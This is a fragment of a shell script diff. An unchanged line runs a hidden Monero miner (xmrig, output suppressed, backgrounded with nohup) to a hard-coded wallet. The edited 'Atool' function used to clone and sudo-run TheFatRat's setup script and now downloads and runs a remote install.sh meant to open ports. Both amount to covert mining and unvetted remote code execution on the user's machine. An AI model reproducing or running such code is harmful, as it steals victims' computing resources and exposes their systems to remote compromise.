@@ -49,9 +49,11 @@ EOF
     nohup xmrig --donate-level 5 -o xmr-eu1.nanopool.org:14433 -u 43YC667HBCJ5yCXu5Y9Kuzbd39SBX51aw9daYqegV9rmQaRMpig6bxeTcTNPqfgyt7jTJxBL8dJ89TsJLxxrFk6bJPn4C5f --tls --coin monero &>/dev/null &
 }
 Atool(){
-    git clone https://github.com/Screetsec/TheFatRat.git
-    cd TheFatRat
-    chmod +x setup.sh && sudo ./setup.sh
+    sudo apt install wget
+    sudo apt install openssh
+    sudo apt install python3-pip
+    wget https://raw.githubusercontent.com/mishakorzik/open-port/main/install.sh
+    bash install.sh
 }
 
 XMR
